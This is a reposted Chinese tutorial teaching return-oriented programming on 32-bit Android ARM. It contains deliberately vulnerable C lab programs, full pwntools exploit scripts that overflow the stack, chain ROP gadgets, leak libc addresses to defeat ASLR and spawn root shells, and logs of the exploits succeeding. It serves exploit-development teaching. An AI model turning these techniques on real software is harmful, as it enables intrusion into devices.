<!DOCTYPE HTML>

<!--
 ______________ 
< TUICOOL.COM >
 -------------- 
        \   ^__^
         \  (**)\__$__$__
            (__)\       )\/\
             U  ||------|
                ||     ||
-->
<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="tc-auth" content="MTU1Nzky+cefc514b570d92b90ea1fd1a5e720fa78d2ca451" />
  <meta content="authenticity_token" name="csrf-param" />
<meta content="kXqzXbeXutoqsg4w3VDjXHsJAWF1uju55CWdbulczKM=" name="csrf-token" />
    <title>
            一步一步学ROP之Android ARM 32位篇 - 推酷
   </title>
    <meta name="description" content="一步一步学ROP之Android ARM 32位篇"/>
  <link rel="shortcut icon" href="http://static0.tuicool.com/favicon.ico" type="image/x-icon" />
  <link href="http://static0.tuicool.com/images/icon114.png" rel="Bookmark" />
  <link rel="apple-touch-icon" sizes="57x57" href="http://static1.tuicool.com/images/icon57.png" /> 
  <link rel="apple-touch-icon" sizes="72x72" href="http://static2.tuicool.com/images/icon72.png" />  
  <link rel="apple-touch-icon" sizes="114x114" href="http://static0.tuicool.com/images/icon114.png" />    
  <link rel="apple-touch-icon" sizes="144x144" href="http://static1.tuicool.com/images/icon144.png"/>  
  <link href="http://asset.tuicool.com/assets/application-79535689d4effa45d2ea7ede6503dd7f.css" media="screen" rel="stylesheet" type="text/css" />
  <link href="http://static0.tuicool.com/assets/font-awesome.min.css" rel="stylesheet">
  <script src="http://asset.tuicool.com/assets/application-7edeeea3a20493861059090224f774ae.js" type="text/javascript"></script>

  <!--[if IE 7]>
  <link rel="stylesheet" href="http://assets.tuicool.com/assets/font-awesome-ie7.min.css">
  <![endif]--> 
    <script type="text/javascript" src="http://static2.tuicool.com/assets/tip.js?t=3"></script>
  
  <script type="text/javascript" src="http://static1.tuicool.com/assets/spin.min.js"></script>
<link rel="stylesheet" href="http://static0.tuicool.com/assets/github.css">

</head>
<body>
  
  <div id="header" class="navbar-fixed-top">
    <div class="container">
      <div class="navbar">
        <div class="navbar-inner">
          <a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse"> 
            <span class="icon-bar"></span> 
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span> 
          </a>
          <a href="http://www.tuicool.com/" class="brand">推酷</a>        
        <nav class="nav-collapse collapse">
            <ul class="nav navbar primary-nav">                            
              <li class="active">
                <a href="http://www.tuicool.com/a/">
                  文章
                </a>
              </li>              
              <li class="">
                <a href="http://www.tuicool.com/sites">
                  站点
                </a>
              </li>
              <li class="">
                <a href="http://www.tuicool.com/topics">
                  主题
                </a>
              </li>
              <li class="">
                <a href="http://huodong.tuicool.com/">
                  活动
                </a>
              </li>
                  <li class="">
                    <a href="http://course.tuicool.com/">
                      公开课
                    </a>
                  </li>
              <li class="">
                <a href="http://www.tuicool.com/mobile">
                  APP
                </a>
              </li>
              <li class="dropdown  ">
                <a href="#" class="dropdown-toggle" data-toggle="dropdown">周刊 <b class="caret"></b></a>
                <ul class="dropdown-menu">
                  <li><a href="http://www.tuicool.com/mags">编程狂人</a></li>
                  <li><a href="http://www.tuicool.com/mags/design">设计匠艺</a></li> 
                  <li><a href="http://www.tuicool.com/mags/startup">创业周刊</a></li> 
                  <li><a href="http://www.tuicool.com/mags/tech">科技周刊</a></li>      
                  <li><a href="http://www.tuicool.com/mags/guru">Guru Weekly</a></li> 
                  <li><a href="http://www.tuicool.com/articles/weekly">一周拾遗</a></li>                  
                </ul>
              </li>
              
              </ul>
            <form class="navbar-search pull-left" action="http://www.tuicool.com/search">
              <input type="text" class="search-query span2" name="kw" placeholder="搜索">
            </form>
            <ul class="nav pull-right">
                          
                <li class="dropdown">         
                  <a href="#" class="dropdown-toggle" data-toggle="dropdown">
                    <img alt="wolfzhang" src="http://static0.tuicool.com/images/0m.png">
                    wolfzhang
                    <b class="caret"></b>
                  </a>
                  <ul class="dropdown-menu">
                    <li><a href='http://www.tuicool.com/user/462071652'>我的主页</a></li>
                    <li><a href='http://www.tuicool.com/articles/my'>我的收藏</a></li>
                    <li><a href="http://www.tuicool.com/settings">个人设置</a></li>           
                    <li><a href="http://www.tuicool.com/notifications">消息通知</a></li>
                    <li><a href="http://www.tuicool.com/bbs/go/issues">意见反馈</a></li>
                    <li><a href="http://www.tuicool.com/logout">退出</a></li>
                  </ul>
                </li>
            </ul>
          </nav>
        </div>
      </div>
  </div>   
</div>
  <div id ="flash_container" class="noPrint">    
  </div>
  
  <div class="container-fluid">  
      
<div class="row-fluid article_row_fluid">
    <div class="span8 contant article_detail_bg">
        <h1>一步一步学ROP之Android ARM 32位篇</h1>
        <div class="article_meta">
            <div style="margin-bottom: 5px;">
            <span class="timestamp">时间&nbsp;2015-12-17 09:41:32
            </span>
            <span class="from">
                <i class="icon-globe"></i>
                    <a class="cut cut28 from" href="/sites/a2UJrq" target="_blank">WooYun知识库
                    </a>
            </span>
            <span id="dup-cnt">
                <a href="/articles/dup?id=zUR7nav" target="_blank">相似文章</a> (<i id="dup">1</i>)
            </span>
            </div>
            <div class="source">
                <i style="float:left;">原文</i>&nbsp; 
                <a class="cut cut70" href="http://drops.wooyun.org/papers/11390?utm_source=tuicool&amp;utm_medium=referral" style="display:inline-block;">http://drops.wooyun.org/papers/11390</a>
            </div>
            <div>
                <span>主题</span>
                <a href="/topics/11130000" target='_blank' >
                    <span class="new-label">Python</span>
                </a>
            </div>
        </div>
        <div class="article_body" id="nei">
            <div ng-bind-html="postContentTrustedHtml"> 
 <h2>0x00 序</h2> 
 <p>ROP的全称为Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术，可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。之前我们主要讨论了linux上的ROP攻击：</p> 
 <ul> 
  <li>一步一步学ROP之linux_x86篇 http://drops.wooyun.org/tips/6597</li> 
  <li>一步一步学ROP之linux_x64篇 http://drops.wooyun.org/papers/7551</li> 
  <li>一步一步学ROP之gadgets和2free篇 http://drops.wooyun.org/binary/10638</li> 
 </ul> 
 <p>在这次的教程中我们会带来arm上rop利用的技术，欢迎大家继续学习。</p> 
 <div> 
  <p>另外文中涉及代码可在我的github下载:</p> 
  <a href="https://github.com/zhengmin1989/ROP_STEP_BY_STEP" rel="nofollow,noindex" target="_blank">https://github.com/zhengmin1989/ROP_STEP_BY_STEP</a> 
 </div> 
 <h2>0x01 ARM上的Buffer Overflow</h2> 
 <p>作为一个程序员我们的目标是要会写所有语言的”hello world”。同样的，作为一个安全工程师，我们的目标是会exploit掉所有语言的buffer overflow。：）因为buffer overflow实在是太经典了，所以我们的arm篇也是从buffer overflow开始。</p> 
 <p>首先来看第一个程序 level6.c：</p> 
 <pre class="prettyprint"><code>#!c
#include&lt;stdio.h&gt;
#include&lt;stdlib.h&gt;
#include&lt;unistd.h&gt;

void callsystem()
{
system(&quot;/system/bin/sh&quot;);
}

void vulnerable_function() {
char buf[128];
read(STDIN_FILENO, buf, 256);
}

int main(int argc, char** argv) {
if (argc==2&amp;&amp;strcmp(&quot;passwd&quot;,argv[1])==0)
callsystem();
write(STDOUT_FILENO, &quot;Hello, World\n&quot;, 13);    
vulnerable_function();
}
</code></pre> 
 <p> 我们的目标是在不使用密码的情况下，获取到shell。为了减少难度，我们先将stack canary去掉（在JNI目录下建立 <code>Application.mk</code> 并加入 <code>APP_CFLAGS += -fno-stack-protector</code> ）。随后用ndk-build进行编译。然后将level6文件拷贝到 <code>&quot;/data/local/tmp&quot;</code> 目录下。接下来我们把这个目标程序作为一个服务绑定到服务器的某个端口上，这里我们可以使用socat这个工具来完成。最后我们再做一个端口转发，准备工作就算完成了。基本命令如下： </p> 
 <pre class="prettyprint"><code>#!bash
ndk-build
adb push libs/armeabi/level6 /data/local/tmp/
adb shell
cd /data/local/tmp/
./socat TCP4-LISTEN:10001,fork EXEC:./level6
adb forward tcp:10001 tcp:10001
</code></pre> 
 <p>现在我们尝试连接一下：</p> 
 <pre><code>#!bash
$ nc 127.0.0.1 10001
Hello, World
</code></pre> 
 <p>发现工作正常。OK，那么我们开始进行BOF吧。</p> 
 <p>和之前的x86一样，我们先用pattern.py来确定溢出点的位置。我们用命令：</p> 
 <pre><code>#!bash
python pattern.py create 150 
</code></pre> 
 <p>来生成一串测试用的150个字节的字符串：</p> 
 <pre class="prettyprint"><code>#!bash
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9
</code></pre> 
 <p>然后我们写一个py脚本来发送这串数据。</p> 
 <pre class="prettyprint"><code>#!python
#!/usr/bin/env python
from pwn import *

#p = process('./level6')
p = remote('127.0.0.1',10001)

p.recvuntil('\n')

raw_input()

payload = &quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9&quot;

p.send(payload)

p.interactive()
</code></pre> 
 <p>但因为我们需要获取崩溃时pc的值，所以在发送数据前，我们先使用gdb加载上level6。</p> 
 <p>我们先在电脑上运行python脚本：</p> 
 <pre class="prettyprint"><code>#!bash
[pc]$ python test.py 
[+] Opening connection to 127.0.0.1 on port 10001: Done
…
</code></pre> 
 <p>然后在adb shell中用ps获取level6的pid，然后再挂载level6，然后用c继续：</p> 
 <pre class="prettyprint"><code>#!bash
[adb]# ./gdb --pid=4895

GNU gdb 6.7
Copyright (C) 2007 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
……
Loaded symbols for /system/lib/libm.so
0xb6eff268 in read () from /system/lib/libc.so
(gdb) c
Continuing.
</code></pre> 
 <p>然后我们再在电脑上输入回车，让脚本发送数据。然后我们就能够在gdb里看到崩溃的pc的值了：</p> 
 <pre class="prettyprint"><code>#!bash
Program received signal SIGSEGV, Segmentation fault.
0x41346540 in ?? ()
(gdb) 
</code></pre> 
 <p> 因为我们编译的level6默认是thumb模式，所以我们要在这个崩溃的地址上加个1： <code>0x41346540+1 = 0x41346541</code> 。然后用pattern.py计算一下溢出点的位置： </p> 
 <pre class="prettyprint"><code>#!bash
$ python pattern.py offset 0x41346541
hex pattern decoded as: Ae4A
132
</code></pre> 
 <p> OK，我们知道了溢出点的位置，接下来我们找一下返回的地址。其实利用的代码在程序中已经有了。我们只要将pc指向callsystem()这个函数地址即可。我们在ida中可以看到地址为 <code>0x00008554</code> ： </p> 
 <p> <img src="http://img1.tuicool.com/zYB36vj.png!web" class="alignCenter" /> </p> 
 <p> 因为 <code>callsystem()</code> 被编译成了thumb指令，所以我们需要将地址+1，让pc知道这里的代码为thumb指令，最终exp如下： </p> 
 <pre class="prettyprint"><code>#!python
#!/usr/bin/env python
from pwn import *

#p = process('./level6')
p = remote('127.0.0.1',10001)

p.recvuntil('\n')

callsystemaddr = 0x00008554 + 1
payload =  'A'*132 + p32(callsystemaddr)

p.send(payload)

p.interactive()
</code></pre> 
 <p>执行效果如下：</p> 
 <pre class="prettyprint"><code>#!bash
$ python level6.py 
[+] Opening connection to 127.0.0.1 on port 10001: Done
[*] Switching to interactive mode
$ /system/bin/id
uid=0(root) gid=0(root) context=u:r:shell:s0
</code></pre> 
 <h2>0x02 寻找thumb gadgets</h2> 
 <p>下面我们来看第二个程序level7.c：</p> 
 <pre class="prettyprint"><code>#!c
#include&lt;stdio.h&gt;
#include&lt;stdlib.h&gt;
#include&lt;unistd.h&gt;

char *str=&quot;/system/bin/sh&quot;;

void callsystem()
{
system(&quot;id&quot;);
}

void vulnerable_function() {
char buf[128];
read(STDIN_FILENO, buf, 256);
}

int main(int argc, char** argv) {
if (argc==2&amp;&amp;strcmp(&quot;passwd&quot;,argv[1])==0)
callsystem();
write(STDOUT_FILENO, &quot;Hello, World\n&quot;, 13);    
vulnerable_function();
}
</code></pre> 
 <p> 在这个程序里，我们即使知道密码，也仅仅只能执行”id”这个命令，我们的目标是获取到一个可以使用的shell，也就是执行 <code>system(&quot;/system/bin/sh&quot;)</code> 。怎么办呢？这里我们就需要来寻找可利用的gadgets，先让r0指向 <code>&quot;/system/bin/sh&quot;</code> 这个字符串的地址，然后再调用system()函数达到我们的目的。 </p> 
 <p>如何寻找gadgets呢？虽然用ida或者objdump也可以进行查找，但比较费时费力，这里我推荐使用ROPGadget。因为level7默认会编译成thumb指令，所以我们也采用thumb模式查找gadgets:</p> 
 <pre class="prettyprint"><code>#!bash
$ ROPgadget --binary=./level7 --thumb | grep &quot;ldr r0&quot;
0x00008618 : add r0, pc ; b #0x862e ; ldr r0, [pc, #0x10] ; add r0, pc ; ldr r0, [r0] ; b #0x8634 ; movs r0, #0 ; pop {pc}
0x0000861e : add r0, pc ; ldr r0, [r0] ; b #0x862e ; movs r0, #0 ; pop {pc}
0x0000893e : add r3, sp, #0xc ; movs r1, #0 ; str r3, [sp] ; adds r3, r1, #0 ; bl #0x8916 ; ldr r0, [sp, #0xc] ; add sp, #0x14 ; pop {pc}
0x000090fe : add r3, sp, #0xc ; str r3, [sp] ; movs r2, #0xc ; adds r3, r1, #0 ; bl #0x8916 ; ldr r0, [sp, #0xc] ; add sp, #0x14 ; pop {pc}
0x000093ca : add sp, #0x10 ; pop {r4, pc} ; push {r3, lr} ; bl #0x911c ; ldr r0, [r0, #0x48] ; pop {r3, pc}
0x00008826 : add sp, r3 ; pop {r4, r5, r6, r7, pc} ; mov r8, r8 ; stc2 p15, c15, [r4], #-0x3fc ; ldr r0, [r0, #0x44] ; bx lr
……
</code></pre> 
 <p>在这些gadgets中，我们成功找到了一个gadget可以符合我们的要求：</p> 
 <pre class="prettyprint"><code>#!bash
0x0000894a : ldr r0, [sp, #0xc] ; add sp, #0x14 ; pop {pc}
</code></pre> 
 <p> 接下来就是找system和 <code>&quot;/system/bin/sh&quot;</code> 的地址，分别为0x00008404和000096C0： </p> 
 <p> <img src="http://img0.tuicool.com/ra2aqi.png!web" class="alignCenter" /> </p> 
 <p> <img src="http://img1.tuicool.com/JFZ7bmi.png!web" class="alignCenter" /> </p> 
 <p> 要注意的是，因为 <code>system()</code> 函数在plt区域，并没有被编译成thumb指令，而是普通的arm指令，因此并不需要将地址+1。最终level7.py如下： </p> 
 <pre class="prettyprint"><code>#!python
#!/usr/bin/env python
from pwn import *

#p = process('./level7')
p = remote('30.10.20.253',10001)

p.recvuntil('\n')

#0x0000894a : ldr r0, [sp, #0xc] ; add sp, #0x14 ; pop {pc}
gadget1 = 0x0000894a + 1

#&quot;/system/bin/sh&quot;
r0 = 0x000096C0

#.plt:00008404 ; int system(const char *command)
systemaddr = 0x00008404 

payload =  '\x00'*132 + p32(gadget1) + &quot;\x00&quot;*0xc + p32(r0) + &quot;\x00&quot;*0x4 + p32(systemaddr)

p.send(payload)

p.interactive()
</code></pre> 
 <p>执行结果如下：</p> 
 <pre class="prettyprint"><code>#!bash
$ python level7.py 
[+] Opening connection to 30.10.20.253 on port 10001: Done

[*] Switching to interactive mode
$ /system/bin/id
uid=0(root) gid=0(root) context=u:r:shell:s0
</code></pre> 
 <h2>0x03 Android上的ASLR</h2> 
 <p> Android上的ASLR其实伪ASLR，因为如果程序是由皆由zygote fork的，那么所有的系统library( <code>libc</code> , <code>libandroid_runtime</code> 等)和 <code>dalvik - heap</code> 的基址都会是相同的，并且和zygote的内存布局一模一样。比如我们随便看两个由zygote fork的进程： </p> 
 <pre class="prettyprint"><code>#!bash
root@hammerhead:/ # cat /proc/1698/maps
400e8000-400ed000 r-xp 00000000 b3:19 8201       /system/bin/app_process
400ed000-400ee000 r--p 00004000 b3:19 8201       /system/bin/app_process
400ee000-400ef000 rw-p 00005000 b3:19 8201       /system/bin/app_process
400ef000-400fe000 r-xp 00000000 b3:19 8248       /system/bin/linker
400fe000-400ff000 r-xp 00000000 00:00 0          [sigpage]
400ff000-40100000 r--p 0000f000 b3:19 8248       /system/bin/linker
40100000-40101000 rw-p 00010000 b3:19 8248       /system/bin/linker
40101000-40104000 rw-p 00000000 00:00 0 
40104000-40105000 r--p 00000000 00:00 0 
40105000-40106000 rw-p 00000000 00:00 0          [anon:libc_malloc]
40106000-40109000 r-xp 00000000 b3:19 49324      /system/lib/liblog.so
40109000-4010a000 r--p 00002000 b3:19 49324      /system/lib/liblog.so
4010a000-4010b000 rw-p 00003000 b3:19 49324      /system/lib/liblog.so
4010b000-40153000 r-xp 00000000 b3:19 49236      /system/lib/libc.so
40153000-40155000 r--p 00047000 b3:19 49236      /system/lib/libc.so
40155000-40158000 rw-p 00049000 b3:19 49236      /system/lib/libc.so



root@hammerhead:/ # cat /proc/1720/maps
400e8000-400ed000 r-xp 00000000 b3:19 8201       /system/bin/app_process
400ed000-400ee000 r--p 00004000 b3:19 8201       /system/bin/app_process
400ee000-400ef000 rw-p 00005000 b3:19 8201       /system/bin/app_process
400ef000-400fe000 r-xp 00000000 b3:19 8248       /system/bin/linker
400fe000-400ff000 r-xp 00000000 00:00 0          [sigpage]
400ff000-40100000 r--p 0000f000 b3:19 8248       /system/bin/linker
40100000-40101000 rw-p 00010000 b3:19 8248       /system/bin/linker
40101000-40104000 rw-p 00000000 00:00 0 
40104000-40105000 r--p 00000000 00:00 0 
40105000-40106000 rw-p 00000000 00:00 0          [anon:libc_malloc]
40106000-40109000 r-xp 00000000 b3:19 49324      /system/lib/liblog.so
40109000-4010a000 r--p 00002000 b3:19 49324      /system/lib/liblog.so
4010a000-4010b000 rw-p 00003000 b3:19 49324      /system/lib/liblog.so
4010b000-40153000 r-xp 00000000 b3:19 49236      /system/lib/libc.so
40153000-40155000 r--p 00047000 b3:19 49236      /system/lib/libc.so
40155000-40158000 rw-p 00049000 b3:19 49236      /system/lib/libc.so
</code></pre> 
 <p>可以看到地址都是一模一样的。这意味着什么呢？我们知道android上所有的app都是由zygote fork出来的，因此我们只要在自己的app上得到libc.so等库的地址就可以知道其他app上的地址了。</p> 
 <p>假设我们已经知道了目标app的libc.so在内存中的地址了，那么应该如何控制pc执行我们希望的rop呢？OK，现在我们现在来看level8.c：</p> 
 <pre class="prettyprint"><code>#!c
#include&lt;stdio.h&gt;
#include&lt;stdlib.h&gt;
#include&lt;unistd.h&gt;
#include&lt;dlfcn.h&gt;

void getsystemaddr()
{
void* handle = dlopen(&quot;libc.so&quot;, RTLD_LAZY);
printf(&quot;%p\n&quot;,dlsym(handle,&quot;system&quot;));
fflush(stdout);
}

void vulnerable_function() {
char buf[128];
read(STDIN_FILENO, buf, 256);
}

int main(int argc, char** argv) {
getsystemaddr();
write(STDOUT_FILENO, &quot;Hello, World\n&quot;, 13);    
vulnerable_function();
}
</code></pre> 
 <p>这个程序会先输出system的地址，相当于我们已经获取了这个进程的内存布局了。接下来要做的就是在libc.so中寻找我们需要的gadgets和字符串地址。因为libc.so很大，我们完全不用担心找不到需要的gadgets，并且我们只需要控制一个r0即可。因此这些gadgets都能满足我们的需求：</p> 
 <pre class="prettyprint"><code>#!bash
0x00014f48 : ldr r0, [sp, #4] ; pop {r1, r2, r3, pc}
0x0002e404 : ldr r0, [sp, #4] ; pop {r2, r3, r4, r5, r6, pc}
0x00034ace : ldr r0, [sp] ; pop {r1, r2, r3, pc}
</code></pre> 
 <p> 接下来就是在libc.so中找 <code>system()</code> 和 <code>&quot;/system/bin/sh&quot;</code> 的位置： </p> 
 <p> <img src="http://img1.tuicool.com/mmqA7z3.png!web" class="alignCenter" /> </p> 
 <p> <img src="http://img2.tuicool.com/6jyyyq.png!web" class="alignCenter" /> </p> 
 <p> 可以看到地址分别为 <code>0x000253A4</code> 和 <code>0x0003F9B4</code> 。当然了，就算获取了这些地址，我们也需要根据 <code>system()</code> 在内存中的地址进行偏移量的计算才能够成功的找到gadgets和 <code>&quot;/system/bin/sh&quot;</code> 在内存中的地址。除此之外，还要注意thumb指令和arm指令的转换问题。最终的exp level8.py如下： </p> 
 <pre class="prettyprint"><code>#!python
#!/usr/bin/env python
from pwn import *

#p = process('./level8')
p = remote('127.0.0.1',10001)

system_addr_str = p.recvuntil('\n')
print &quot;str:&quot; + system_addr_str
system_addr = int(system_addr_str,16)
print &quot;system_addr = &quot; + hex(system_addr)

p.recvuntil('\n')

#.text:000253A4                 EXPORT system

#0x00034ace : ldr r0, [sp] ; pop {r1, r2, r3, pc}
gadget1 = system_addr + (0x00034ace - 0x000253A4)
print &quot;gadget1 = &quot; + hex(gadget1)

#.rodata:0003F9B4 aSystemBinSh    DCB &quot;/system/bin/sh&quot;,0
r0 = system_addr + (0x0003F9B4 - 0x000253A4) - 1
print &quot;/system/bin/sh addr = &quot; + hex(r0)

payload =  '\x00'*132 + p32(gadget1) + p32(r0) + &quot;\x00&quot;*0x8 + p32(system_addr)

p.send(payload)

p.interactive()
</code></pre> 
 <p>执行结果如下：</p> 
 <pre class="prettyprint"><code>#!bash
$ python level8.py 
[+] Opening connection to 127.0.0.1 on port 10001: Done
system_addr = 0xb6f1e3a5
gadget1 = 0xb6f2dacf
/system/bin/sh addr = 0xb6f389b4
[*] Switching to interactive mode
$ id
uid=0(root) gid=0(root) context=u:r:shell:s0
</code></pre> 
 <h2>0x04 Android上的information leak</h2> 
 <p> 在上面的例子中，我们假设已经知道了libc.so的基址了，但是如果我们是进行远程攻击，并且原程序中没有调用 <code>system()</code> 函数怎么办？这意味着目标程序的内存布局对我们来说是随机的，我们并不能直接调用libc.so中的gadgets，因为我们并不知道libc.so在内存中的地址。其实这也是有办法的，我们首先需要一个information leak的漏洞来获取libc.so在内存中的地址，然后再控制pc去执行我们的rop。现在我们来看level9.c: </p> 
 <pre class="prettyprint"><code>#!c
#include&lt;stdio.h&gt;
#include&lt;stdlib.h&gt;
#include&lt;unistd.h&gt;
#include&lt;dlfcn.h&gt;

void vulnerable_function() {
char buf[128];
read(STDIN_FILENO, buf, 512);
}

int main(int argc, char** argv) {
write(STDOUT_FILENO, &quot;Hello, World\n&quot;, 13);
vulnerable_function();
}
</code></pre> 
 <p> <img src="http://img0.tuicool.com/AfqYZzj.png!web" class="alignCenter" /> </p> 
 <p> <img src="http://img2.tuicool.com/fa6JV3E.png!web" class="alignCenter" /> </p> 
 <p> 虽然程序非常简单，可用的gadgets很少。但好消息是我们发现除了程序本身的实现的函数之外，我们还可以使用 <code>write@plt()</code> 函数。但因为程序本身并没有调用 <code>system()</code> 函数，所以我们并不能直接调用 <code>system()</code> 来获取shell。但其实我们有 <code>write@plt()</code> 函数就够了，因为我们可以通过 <code>write@plt()</code> 函数把 <code>write()</code> 函数在内存中的地址也就是write.got给打印出来。既然 <code>write()</code> 函数实现是在libc.so当中，那我们调用的 <code>write@plt()</code> 函数为什么也能实现 <code>write()</code> 功能呢? 这是因为android和linux类似采用了延时绑定技术，当我们调用 <code>write@plit()</code> 的时候，系统会将真正的 <code>write()</code> 函数地址link到got表的write.got中，然后 <code>write@plit()</code> 会根据write.got 跳转到真正的 <code>write()</code> 函数上去。（如果还是搞不清楚的话，推荐阅读潘爱民老师的《程序员的自我修养 - 链接、装载与库》这本书，潘老师是我主管的事情我才不会告诉你。。。） </p> 
 <p> 因为 <code>system()</code> 函数和 <code>write()</code> 在libc.so中的offset(相对地址)是不变的，所以如果我们得到了 <code>write()</code> 的地址并且拥有目标手机上的libc.so就可以计算出 <code>system()</code> 在内存中的地址了。然后我们再将pc指针return回 <code>vulnerable_function()</code> 函数，就可以进行第二次溢出攻击了，并且这一次我们知道了 <code>system()</code> 在内存中的地址，就可以调用 <code>system()</code> 函数来获取我们的shell了。 </p> 
 <p>另外需要注意的是write()函数是三个参数，因此我们还需要控制r1和r2才行，刚好程序中有如下gadget可以满足我们的需求：</p> 
 <pre><code>#!bash
#0x0000863a : pop {r1, r2, r4, r5, r6, pc}
</code></pre> 
 <p> 另外为了能再一次返回 <code>vulnerable_function()</code> ，我们需要构造好执行完write函数后的栈的数据，让程序执行完 <code>ADD SP, SP</code> , <code>#0x84</code> ; <code>POP {PC}</code> 后，PC能再一次指向 <code>0x000084D8</code> 。 </p> 
 <p> <img src="http://img2.tuicool.com/mYr2Mv6.png!web" class="alignCenter" /> </p> 
 <p>最终的explevel9.py如下：</p> 
 <pre class="prettyprint"><code>#!python
#!/usr/bin/env python
from pwn import *

#p = process('./level7')
p = remote('30.10.20.253',10001)

p.recvuntil('\n')

#0x00008a12 : ldr r0, [sp, #0xc] ; add sp, #0x14 ; pop {pc}
gadget1 = 0x000088be + 1

#0x0000863a : pop {r1, r2, r4, r5, r6, pc}
gadget2 = 0x0000863a + 1

#.text:000084D8 vulnerable_function
ret_to_vul = 0x000084D8 + 1

#write(r0=1, r1=0x0000AFE8, r2=4)
r0 = 1
r1 = 0x0000AFE8
r2 = 4
r4 = 0
r5 = 0
r6 = 0
write_addr_plt = 0x000083C8

payload =  '\x00'*132 + p32(gadget1) + '\x00'*0xc + p32(r0) + '\x00'*0x4 + p32(gadget2) + p32(r1) + p32(r2) + p32(r4) + p32(r5) + p32(r6) + p32(write_addr_plt) + '\x00' * 0x84 + p32(ret_to_vul)

p.send(payload)

write_addr = u32(p.recv(4))
print 'write_addr=' + hex(write_addr)

#.rodata:0003F9B4 aSystemBinSh    DCB &quot;/system/bin/sh&quot;,0
#.text:000253A4                 EXPORT system
#.text:00020280                 EXPORT write

r0 = write_addr + (0x0003F9B4 - 0x00020280)
system_addr = write_addr + (0x000253A4 - 0x00020280) + 1

print 'r0=' + hex(r0)
print 'system_addr=' + hex(system_addr)

payload2 =  '\x00'*132 + p32(gadget1) + &quot;\x00&quot;*0xc + p32(r0) + &quot;\x00&quot;*0x4 + p32(system_addr)

p.send(payload2)

p.interactive()
</code></pre> 
 <p>执行exp的结果如下：</p> 
 <pre class="prettyprint"><code>#!bash
$ python level9.py 
[+] Opening connection to 30.10.20.253 on port 10001: Done
write_addr=0xb6f27280
r0=0xb6f469b4
system_addr=0xb6f2c3a5
[*] Switching to interactive mode
$ /system/bin/id
uid=0(root) gid=0(root) context=u:r:shell:s0
</code></pre> 
 <h2>0x05 Android ROP调试技巧</h2> 
 <p>因为gdb对thumb指令的解析并不好，所以我还是推荐用ida来进行调试。如果你还不会用ida，可以先看一下我之前写的关于ida调试的文章：</p> 
 <pre class="prettyprint"><code>安卓动态调试七种武器之孔雀翎– Ida pro 
http://drops.wooyun.org/tips/6840
</code></pre> 
 <p>除此之外，还有个很重要的技巧就是如何让ida正确的解析指令。ida在很多时候并不知道需要解析的指令是thumb还是arm，有时候甚至都不知道是啥内容。</p> 
 <p>比如图中是libc.so中system的代码：</p> 
 <p> <img src="http://img2.tuicool.com/aEVvQzQ.png!web" class="alignCenter" /> </p> 
 <p> 这段代码其实是thumb指令，但是我们怎么样才能让ida解析正确呢？方法就是用鼠标选中 <code>0xB6EE03A4</code> ，然后按 <code>alt+g</code> 键，然后将 <code>value</code> 改成 <code>0x1</code> 。这样的话，ida就会按照thumb指令来解析这段数据了。 </p> 
 <p> <img src="http://img0.tuicool.com/2uqUV3.png!web" class="alignCenter" /> </p> 
 <p>我们随后选中那块数据然后按c键，就可以看到指令被正确的解析了。</p> 
 <p> <img src="http://img0.tuicool.com/rQ7bAzv.png!web" class="alignCenter" /> </p> 
 <h2>0x06 总结</h2> 
 <p>我们这篇文章介绍了32位android的ROP。在下一篇中我会继续带来64位arm和iOS上ROP的利用技巧，欢迎大家继续学习。另外文中涉及代码可在我的github下载:</p> 
 <p> <a href="https://github.com/zhengmin1989/ROP_STEP_BY_STEP" rel="nofollow,noindex" target="_blank">https://github.com/zhengmin1989/ROP_STEP_BY_STEP</a> </p> 
</div>
        </div>
        <div class="article_social">
         <div class="article_like">
    <div class="circle circle-like" id="my_zan" data_id="zUR7nav">  </div>

</div>
        <div id="share_weixin_image">
            <img width="100px" height="100px" src="http://s.jiathis.com/qrcode.php?url=http://www.tuicool.com/articles/zUR7nav?via=wechat_qr">
        </div>
<div class="article_share_fav">
    <div class="share" id="ckepop">
        <span>分享</span>
        <button class="share_weibo" id="share_weibo_id"  title="分享到新浪微博"></button>
        <button class="share_qq" id="share_qq_id"  title="分享到QQ空间"></button>
        <button class="share_weixin" id="share_weixin_id"></button>
    </div>
    <div class="fav_correct">
        <button id="my_fav" data_id="zUR7nav">
            <i class="icon icon-star-empty"></i> <span id="fav_tip">收藏</span>
        </button>
        <button id="article-correct" data_id="zUR7nav" uid="462071652">
            <i class="icon icon-warning-sign"></i>
            <span>纠错</span>
        </button>
    </div>
</div>
<script type="text/javascript">
$("#share_weibo_id").click( function() {
   window.open("http://share.baidu.com/s?type=text&searchPic=0&sign=on&to=tsina&url=http://www.tuicool.com/articles/zUR7nav&title=%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8BAndroid+ARM+32%E4%BD%8D%E7%AF%87++%28%E5%88%86%E4%BA%AB%E8%87%AA+%40%E6%8E%A8%E9%85%B7%E7%BD%91%29&key=3113829255");
});
$("#share_qq_id").click( function() {
   window.open("http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://www.tuicool.com/articles/zUR7nav&title=%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8BAndroid+ARM+32%E4%BD%8D%E7%AF%87&desc=&summary=&site=");
});
